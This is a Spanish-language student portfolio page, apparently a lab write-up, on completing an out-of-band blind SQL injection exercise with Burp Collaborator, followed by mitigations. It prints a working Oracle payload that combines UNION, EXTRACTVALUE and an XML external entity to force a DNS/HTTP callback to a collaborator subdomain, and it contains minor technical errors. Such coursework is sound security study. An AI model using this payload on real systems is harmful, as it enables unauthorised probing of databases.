@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Laboratorio 16 · Blind SQL injection with out-of-band interaction</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  background: linear-gradient(180deg, #fff5f9, #ffe0ec);
+  overflow-x: hidden;
+  color: #3a1c2b;
+}
+
+.blur {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(70px);
+  opacity: 0.6;
+  z-index: 0;
+  animation: float 6s ease-in-out infinite;
+}
+
+.blur.one {
+  width: 360px;
+  height: 360px;
+  background: #ff9ac1;
+  top: -120px;
+  left: -120px;
+}
+
+.blur.two {
+  width: 300px;
+  height: 300px;
+  background: #ffb3d9;
+  bottom: -100px;
+  right: -100px;
+  animation-delay: 2s;
+}
+
+.blur.three {
+  width: 240px;
+  height: 240px;
+  background: #ffc2e1;
+  top: 40%;
+  right: 20%;
+  animation-delay: 4s;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px) scale(1); }
+  50% { transform: translateY(-20px) scale(1.05); }
+}
+
+.wrapper {
+  position: relative;
+  z-index: 1;
+  max-width: 1100px;
+  margin: 70px auto;
+  padding: 20px;
+}
+
+.card {
+  background: rgba(255,255,255,0.85);
+  backdrop-filter: blur(12px);
+  border-radius: 32px;
+  padding: 55px;
+  box-shadow: 0 40px 80px rgba(255,122,168,0.25), inset 0 1px 0 rgba(255,255,255,0.6);
+  transform: translateY(0);
+  transition: transform 0.5s ease, box-shadow 0.5s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 50px 100px rgba(255,122,168,0.35);
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.header h1 {
+  font-size: 2.8rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.alias {
+  font-size: 1rem;
+  font-weight: 400;
+  color: #ff4f9a;
+}
+
+.header h2 {
+  margin-top: 12px;
+  font-size: 1.4rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.meta {
+  margin-top: 6px;
+  font-size: 0.95rem;
+  color: #6b3a52;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+nav {
+  margin-top: 40px;
+}
+
+nav ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 18px;
+  list-style: none;
+}
+
+nav a {
+  text-decoration: none;
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+nav ul li {
+  position: relative;
+}
+
+.submenu {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  background: rgba(255,255,255,0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 10px 0;
+  min-width: 200px;
+  box-shadow: 0 20px 40px rgba(255,79,154,0.3);
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(20px);
+  transition: all 0.3s ease;
+  z-index: 100;
+  list-style: none;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav ul li:hover .submenu {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(10px);
+}
+
+.submenu a {
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+.submenu a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+/* Secciones estilo portafolio */
+.brief-text, .tech-section, .student-profile, .contact-section {
+  background: rgba(255,255,255,0.7);
+  border-radius: 24px;
+  padding: 35px;
+  margin-top: 40px;
+  box-shadow: 0 15px 35px rgba(255,122,168,0.15);
+  border-left: 5px solid #ff4f9a;
+  transition: transform 0.3s ease;
+}
+
+.brief-text:hover, .tech-section:hover, .student-profile:hover, .contact-section:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 20px 45px rgba(255,79,154,0.2);
+}
+
+.brief-text h3, .tech-section h3, .student-profile h3, .contact-section h3 {
+  font-size: 1.8rem;
+  color: #ff4f9a;
+  margin-bottom: 25px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  border-bottom: 2px solid #ffe0ec;
+  padding-bottom: 12px;
+}
+
+.brief-text h4, .student-profile h4 {
+  font-size: 1.5rem;
+  color: #ff4f9a;
+  margin-bottom: 15px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.brief-text h5, .student-profile h5 {
+  font-size: 1.2rem;
+  color: #4a2a36;
+  margin: 20px 0 10px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.img-placeholder {
+  background: linear-gradient(145deg, #ffe0ec, #ffb3d9);
+  border-radius: 20px;
+  padding: 20px;
+  margin: 20px 0;
+  text-align: center;
+  border: 2px dashed #ff4f9a;
+}
+
+.img-placeholder img {
+  max-width: 600px;
+  width: 100%;
+  height: auto;
+  border-radius: 20px;
+  box-shadow: 0 10px 25px rgba(255,79,154,0.2);
+  display: block;
+  margin: 0 auto;
+}
+
+.code-container {
+  background: #2d1b21;
+  border-radius: 16px;
+  padding: 20px;
+  margin: 20px 0;
+  border-left: 6px solid #ff4f9a;
+  overflow-x: auto;
+}
+
+.code-container pre {
+  margin: 0;
+  color: #ffe0ec;
+  font-family: 'Courier New', monospace;
+  font-size: 0.9rem;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+
+.footer {
+  width: 100%;
+  padding: 20px 0;
+  text-align: center;
+  background: rgba(0,0,0,0.35);
+  border-radius: 20px;
+  margin-top: 60px;
+  backdrop-filter: blur(5px);
+}
+
+.footer-content {
+  color: #f3f3f3;
+  font-size: 14px;
+}
+
+.footer-content a {
+  color: white;
+  text-decoration: underline;
+  text-decoration-color: #ff8fc4;
+}
+
+.lista-personalizada {
+  list-style: none;
+  padding-left: 0;
+}
+
+.lista-personalizada li {
+  margin-bottom: 10px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+
+@media (max-width: 900px) {
+  .card { padding: 30px 20px; }
+  .header h1 { font-size: 2rem; flex-direction: column; }
+}
+</style>
+</head>
+<body>
+
+<div class="blur one"></div>
+<div class="blur two"></div>
+<div class="blur three"></div>
+
+<div class="wrapper">
+  <div class="card">
+
+    <!-- ========== ENCABEZADO ========= -->
+    <div class="header">
+      <h1><i class="fas fa-user-secret"></i> Laura Ivon Montelongo Martínez<span class="alias">| Alias: Ivonne</span></h1>
+      <h2><i class="fas fa-shield-alt"></i> CNO V – Seguridad Informática</h2>
+      <p class="meta"><i class="fas fa-graduation-cap"></i> ITI · Universidad Politécnica de San Luis Potosí</p>
+      <p class="meta"><i class="far fa-calendar-alt"></i> Periodo: Enero – Junio 2026</p>
+    </div>
+
+    <!-- ========== NAV ========= -->
+    <nav>
+        <ul>
+          <li><a href="index.html"><i class="fas fa-home"></i> Inicio</a></li>
+          <li>
+            <a href="#"><i class="fas fa-laptop-code"></i> Actividades <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="actividades.html"><i class="fas fa-file-alt"></i> Primer Parcial</a></li>
+              <li><a href="segundo-parcial.html"><i class="fas fa-file-alt"></i> Segundo Parcial</a></li>
+              <li><a href="tercer-parcial.html"><i class="fas fa-file-alt"></i> Tercer Parcial</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#"><i class="fas fa-trophy"></i> ROAD TO HALL OF FAME <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="road-to-hall-of-fame2.html#sql-injection"><i class="fas fa-database"></i> SQL Injection</a></li>
+            </ul>
+          </li>
+          <li><a href="#"><i class="fas fa-file-alt"></i> Notas</a></li>
+          <li>
+            <a href="#"><i class="fas fa-project-diagram"></i> Proyectos <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="PR01.html"><i class="fas fa-file-alt"></i>PR01</a></li>
+              <li><a href="PR02_01.html"><i class="fas fa-file-alt"></i>PR02-01</a></li>
+              <li><a href="PR02_02.html"><i class="fas fa-file-alt"></i>PR02-02</a></li>
+              <li><a href="PR02_03.html"><i class="fas fa-file-alt"></i>PR02-03</a></li>
+            </ul>
+          </li>
+          <li><a href="#"><i class="fas fa-certificate"></i> Certificaciones</a></li>
+        </ul>
+      </nav>
+    <!-- ========== TÍTULO LABORATORIO 16 ========= -->
+    <div class="brief-text" style="margin-top: 20px;">
+      <h3><i class="fas fa-database"></i> Laboratorio 16: Blind SQL injection with out-of-band interaction</h3>
+    </div>
+
+    <!-- ========== DETALLES ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-flag"></i> Detalles</h4>
+      <p><b>Nivel:</b> Intermedio (Practitioner)</p>
+      <p><b>Tipo de SQLi:</b> Inyección SQL fuera de banda (out-of-band)</p>
+    </section>
+
+    <!-- ========== OBJETIVO ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+      <p>Explotar una vulnerabilidad de inyección SQL en una cookie de seguimiento, causando una búsqueda DNS en Burp Collaborator.</p>
+    </section>
+
+    <!-- ========== VULNERABILIDAD ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-bug"></i> Vulnerabilidad</h4>
+      <p>Cookie de Rastreo; Puede modificarse cambiándola por una carga útil, la cual es una mezcla en la inyección SQL con una técnica XXE (XAML External Entity) que activa una interacción con el servidor Burp Collaborator. Esta técnica aprovecha configuraciones débiles en los analizadores XML para leer archivos locales, realizar peticiones a redes internas o ejecutar código.</p>
+    </section>
+
+    <!-- ========== PROCEDIMIENTO ========= -->
+    <section class="student-profile">
+      <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+
+      <p>Antes de comenzar se avisa que para esta práctica es necesario utilizar la versión profesional de Burpsuite.</p>
+      <div class="img-placeholder">
+        <img src="labo16.1.png" alt="Paso 1 - Interceptar solicitud">
+      </div>
+
+      <p>Se envían todas las solicitudes HTTP que realiza el navegador. Posterior se manda al Repeater la solicitud HTTP de la página de inicio del sitio. En el repeater se observa la respuesta del sitio al enviar dicha solicitud. En cookies se encuentra el <code>tracking_id</code>, la vulnerabilidad que tenemos a la mano para poder explotar el sitio.</p>
+      <div class="img-placeholder">
+        <img src="lab16.2.png" alt="Paso 2 - TrackingId en Repeater">
+      </div>
+
+      <p>Posteriormente, se genera un “Burp Collaborator Client”. La herramienta principal para este laboratorio. Un subdominio específico del colaborador, este permite detectar vulnerabilidades que no devuelven una respuesta directa en el sitio web.</p>
+      <div class="img-placeholder">
+        <img src="lab16.3.png" alt="Paso 3 - Burp Collaborator">
+      </div>
+
+      <p>Esto genera un subdominio único del Burp Colaborator Client, el cual nos servirá más tarde para obtener el resultado de la búsqueda DNS. Con la herramienta el subdominio se sondea para confirmar que la búsqueda DNS se haya realizado.</p>
+      <br>
+
+      <h5>Pista de la actividad</h5>
+      <p>Nos sugiere indagar en el “acordeón” de inyección SQL. La parte que nos interesa es la sección de búsqueda DNS.</p>
+      <div class="img-placeholder">
+        <img src="labo16.4.png" alt="Paso 5 - Acordeón de inyección SQL">
+      </div>
+      <div class="img-placeholder">
+        <img src="labo16.5.png" alt="Paso 5 - Acordeón de inyección SQL">
+      </div>
+
+      <p>El XXE que nos interesa en este caso es de la versión para bases de datos de Oracle. Existen dos versiones este, uno para versiones aún sin parchar y otro para versiones parchadas, pero este requiere tener privilegios elevados para realizarse.</p>
+      <div class="img-placeholder">
+        <img src="labo16.6.png" alt="Paso 6 - Payload sugerido">
+      </div>
+
+      <p>Esta es la carga útil que mezclaremos con la consulta de la cookie de rastreo. Incluyendo el subdominio generado. Con este, el servidor de la base de datos se ve obligado a una petición DNS y HTTP hacia nuestro subdominio. La función del payload no es “tomar información” si no actuar como un radar, forzando a la base de datos a llamar al servidor.</p>
+
+      <p>Se le agrega la comilla simple para cerrar la cadena de texto original de la cookie de seguimiento. Lo que podría ser una consulta similar a esta:</p>
+      <div class="code-container">
+        <pre><code>SELECT tracking_id FROM analytics WHERE tracking_id = “cadena de la cookie”</code></pre>
+      </div>
+      <p>Al colocar la comilla al principio del payload cierra el valor de la cookie, preparando la consulta para inyectar el código malicioso. Posterior a esto utilizamos el operador OR que sirve para concatenación, uniendo el resultado de la consulta original con el de la consulta inyectada.</p><br>
+
+      <p>Al enviar la petición en el Repeater, sondeamos las interacciones que ha tenido el subdominio y se encuentra lo siguiente:</p>
+      <div class="img-placeholder">
+        <img src="labo16.7.png" alt="Paso 8 - Interacción DNS recibida">
+      </div>
+
+      <p>Por el nombre del dominio y la IP corroboramos que se logró realizar la búsqueda con éxito. Lo que muestra que el laboratorio ha sido completado.</p>
+      <div class="img-placeholder">
+        <img src="labo16.8.png" alt="Paso 8 - Interacción DNS recibida">
+      </div>
+    </section>
+
+    <!-- ========== INFORME FINAL ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-file-alt"></i> Informe final</h4>
+      <h5>Vulnerabilidad Identificada</h5>
+      <p>Se identificó una vulnerabilidad de inyección SQL fuera de banda (out-of-band) en la cookie <code>TrackingId</code>. Al inyectar un payload que combina SQL con una técnica XXE específica para Oracle, se logró que la base de datos realizara una petición DNS al servidor Burp Collaborator, confirmando la ejecución de código arbitrario y la falta de filtrado en la entrada.</p>
+
+      <h5>Payload Utilizado</h5>
+      <div class="code-container">
+        <pre><code>' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMINIO.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--</code></pre>
+      </div>
+      <p>(El payload exacto puede variar según la versión de Oracle, pero se basa en la inyección de una entidad externa XML que fuerza una petición DNS).</p>
+
+      <h5>Mitigación Recomendada</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Utilizar consultas parametrizadas (prepared statements) para evitar la inyección SQL en cualquier parámetro, incluyendo cookies.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Deshabilitar funcionalidades XML peligrosas en la base de datos, como <code>EXTRACTVALUE</code> y <code>xmltype</code> si no son necesarias.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Aplicar el principio de mínimo privilegio a la cuenta de base de datos utilizada por la aplicación.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Implementar firewalls de aplicaciones web (WAF) que inspeccionen y bloqueen patrones de ataques out-of-band.</li>
+      </ul>
+    </section>
+
+    <!-- ========== EVIDENCIA DE FINALIZACIÓN ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-certificate"></i> Evidencia</h4>
+      <p>Captura de pantalla que acredita la realización exitosa del laboratorio.</p>
+      <div class="img-placeholder">
+        <img src="Lab16Evidencia.png" alt="Evidencia laboratorio resuelto">
+      </div>
+    </section>
+
+  </div> <!-- fin card -->
+</div> <!-- fin wrapper -->
+
+<footer class="footer">
+  <div class="footer-content">
+    <p>© 2026 <strong>Laura Ivon Montelongo Martínez</strong> · 177291 · CNO V · Seguridad Informática</p>
+    <p><a href="mailto:177291@upslp.edu.mx">177291@upslp.edu.mx</a> · Laboratorio 16 · Blind SQL injection out-of-band</p>
+  </div>
+</footer>
+
+</body>
+</html>
